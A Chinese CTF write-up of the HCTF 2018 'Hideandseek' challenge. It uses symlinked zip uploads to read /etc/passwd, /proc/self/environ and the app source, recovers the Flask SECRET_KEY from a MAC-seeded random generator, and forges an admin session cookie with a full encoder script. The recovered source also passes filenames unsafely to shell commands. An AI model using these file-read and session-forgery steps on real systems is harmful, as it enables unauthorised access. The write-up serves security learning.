---
title: '[HCTF 2018]Hideandseek'
date: 2024-11-19 15:39:42
tags:
      - 伪随机数
      - 文件上传
      - 软连接
categories: 刷题笔记
---

### [HCTF 2018]Hideandseek

页面提示我们先登录，我们随便输入username和password直接就注册登录了

![image-20241119154640636](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411191546746.png)

但当我们尝试admin时却发现，页面同时我们非admin，看样子这是需要进行伪造admin了

我们随便登个账号，页面提示我们传zip文件

### 文件读取

我们使用软连接来读取文件

```
在linux环境下执行
ln -s /etc/passwd passwd
zip -y passwd.zip passwd
```

不想打开一个文件就得重新写一次软连接的话，我们用另一个大佬的wp（...有报错不知道为啥）

```
#coding=utf-8
import os
import requests
import sys

url = 'http://0a716e50-1cf2-4cd8-a00f-b70d9987ed64.node3.buuoj.cn/upload'
def makezip():
    os.system('ln -s '+sys.argv[1]+' exp')
    os.system('zip --symlinks exp.zip exp')
makezip()

files = {'the_file':open('./exp.zip','rb')}
def exploit():
    res = requests.post(url,files=files)
    print(res.text)

exploit()
os.system('rm -rf exp')
os.system('rm -rf exp.zip')


```

我们还是用第一种办法吧，将得到的passwd.zip进行上传，我们得到正常回显

![image-20241119161952965](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411191619041.png)

### 读取/proc/self/environ

我们查看环境变量

```
ln -s /proc/self/environ en
zip -y en.zip en
```

将得到的en.zip进行上传

![读取/app/uwsgi.ini](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411191621356.png)

### 读取/app/uwsgi.ini

注意`DUWSGI_INI=/app/uwsgi.ini`

> uWSGI是一个Web服务器，它实现了WSGI协议、uwsgi、http等协议。Nginx中HttpUwsgiModule的作用是与uWSGI服务器进行交换。WSGI是一种Web服务器网关接口。它是一个Web服务器（如nginx，uWSGI等服务器）与web应用（如用Flask框架写的程序）通信的一种规范。
> 
>

接下来我们来读取/app/uwsgi.ini

```
ln -s /app/uwsgi.ini us
zip -y us.zip us
```

我们提交us.zip

![image-20241119162540494](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411191625530.png)

看wp说buu的环境有点问题，正常的/app/uwsgi.ini应该回显

```
module=/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py
```

读取module=/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py得到源文件

```
ln -s /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py a
zip -y a.zip a
```

得到源码

```python
# -*- coding: utf-8 -*-
from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
import uuid
import base64
import random
import flag
from werkzeug.utils import secure_filename
import os
random.seed(uuid.getnode())
app = Flask(__name__)
app.config['SECRET_KEY'] = str(random.random()*100)
app.config['UPLOAD_FOLDER'] = './uploads'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
ALLOWED_EXTENSIONS = set(['zip'])

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route('/', methods=['GET'])
def index():
    error = request.args.get('error', '')
    if(error == '1'):
        session.pop('username', None)
        return render_template('index.html', forbidden=1)

    if 'username' in session:
        return render_template('index.html', user=session['username'], flag=flag.flag)
    else:
        return render_template('index.html')


@app.route('/login', methods=['POST'])
def login():
    username=request.form['username']
    password=request.form['password']
    if request.method == 'POST' and username != '' and password != '':
        if(username == 'admin'):
            return redirect(url_for('index',error=1))
        session['username'] = username
    return redirect(url_for('index'))


@app.route('/logout', methods=['GET'])
def logout():
    session.pop('username', None)
    return redirect(url_for('index'))

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'the_file' not in request.files:
        return redirect(url_for('index'))
    file = request.files['the_file']
    if file.filename == '':
        return redirect(url_for('index'))
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        if(os.path.exists(file_save_path)):
            return 'This file already exists'
        file.save(file_save_path)
    else:
        return 'This file is not a zipfile'


    try:
        extract_path = file_save_path + '_'
        os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
        read_obj = os.popen('cat ' + extract_path + '/*')
        file = read_obj.read()
        read_obj.close()
        os.system('rm -rf ' + extract_path)
    except Exception as e:
        file = None

    os.remove(file_save_path)
    if(file != None):
        if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
            return redirect(url_for('index', error=1))
    return Response(file)


if __name__ == '__main__':
    #app.run(debug=True)
    app.run(host='0.0.0.0', debug=True, port=10008)

```

### 伪随机数种子

有了源码，我们就需要根据源码伪造admin的session，而session构造需要SECRET_KEY，看源码，SECRET_KEY等于一个随机数，但是这个随机数是通过设置随机数种子生成的。而如果我们知道这个种子，就知道了后面生成的随机数

```
random.seed(uuid.getnode())
app = Flask(__name__)
app.config['SECRET_KEY'] = str(random.random()*100)

```

我们看一下生成伪随机数种子的函数uuid.getnode()

#### 关于uuid.getnode()

源链接：[Python——uuid](https://www.cnblogs.com/Security-Darren/p/4252868.html)

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/f0b897e36ebc7b6128b0637537a3b874.png)



#### 获取mac地址

我们想得到种子，就得知道容器的mac地址

我们尝试读取`/sys/class/net/eth0/address`来得到mac地址

```
ln -s /sys/class/net/eth0/address mac
zip -y mac.zip mac

```

![image-20241119164230093](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411191642158.png)

得到mac地址 **ae:34:53:c6:20:88**

#### 由mac地址得到伪随机数种子

```python
import uuid
import random

mac = "ae:34:53:c6:20:88"
temp = mac.split(':')
temp = [int(i,16) for i in temp]
temp = [bin(i).replace('0b','').zfill(8) for i in temp]
temp = ''.join(temp)
mac = int(temp,2)
print(mac)#将mac转为十进制

random.seed(mac)
print(random.random()*100)#由转化后的mac得到伪随机数种子 SECRET_KEY

---------- python3.8 ----------
191539767025800
46.189843351464276

输出完成 (耗时 0 秒) - 正常终止

```

### 伪造session

```
""" Flask Session Cookie Decoder/Encoder """
__author__ = 'Wilson Sumanang, Alexandre ZANNI'

# standard imports
import sys
import zlib
from itsdangerous import base64_decode
import ast

# Abstract Base Classes (PEP 3119)
if sys.version_info[0] < 3:  # < 3.0
    raise Exception('Must be using at least Python 3')
elif sys.version_info[0] == 3 and sys.version_info[1] < 4:  # >= 3.0 && < 3.4
    from abc import ABCMeta, abstractmethod
else:  # > 3.4
    from abc import ABC, abstractmethod

# Lib for argument parsing
import argparse

# external Imports
from flask.sessions import SecureCookieSessionInterface


class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


if sys.version_info[0] == 3 and sys.version_info[1] < 4:  # >= 3.0 && < 3.4
    class FSCM(metaclass=ABCMeta):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e

        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if (secret_key == None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e
else:  # > 3.4
    class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e

        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if (secret_key == None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e

if __name__ == "__main__":
    # Args are only relevant for __main__ usage

    ## Description for help
    parser = argparse.ArgumentParser(
        description='Flask Session Cookie Decoder/Encoder',
        epilog="Author : Wilson Sumanang, Alexandre ZANNI")

    ## prepare sub commands
    subparsers = parser.add_subparsers(help='sub-command help', dest='subcommand')

    ## create the parser for the encode command
    parser_encode = subparsers.add_parser('encode', help='encode')
    parser_encode.add_argument('-s', '--secret-key', metavar='<string>',
                               help='Secret key', required=True)
    parser_encode.add_argument('-t', '--cookie-structure', metavar='<string>',
                               help='Session cookie structure', required=True)

    ## create the parser for the decode command
    parser_decode = subparsers.add_parser('decode', help='decode')
    parser_decode.add_argument('-s', '--secret-key', metavar='<string>',
                               help='Secret key', required=False)
    parser_decode.add_argument('-c', '--cookie-value', metavar='<string>',
                               help='Session cookie value', required=True)

    ## get args
    args = parser.parse_args()

    ## find the option chosen
    if (args.subcommand == 'encode'):
        if (args.secret_key is not None and args.cookie_structure is not None):
            print(FSCM.encode(args.secret_key, args.cookie_structure))
    elif (args.subcommand == 'decode'):
        if (args.secret_key is not None and args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value, args.secret_key))
        elif (args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value))
```

```
python session_encode.py encode -s "46.189843351464276" -t "{'username':'admin'}"

eyJ1c2VybmFtZSI6ImFkbWluIn0.ZzxRYg.tvKnErnnPCzfHmK6t8FMbMy87Ns
```

### FLAG

将得到的session进行替换，得到flag

![image-20241119165205779](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411191652842.png)



参考

https://blog.csdn.net/rabcdxb/article/details/119654409

https://blog.csdn.net/crisprx/article/details/107328520

https://blog.csdn.net/mochu7777777/article/details/105190181/
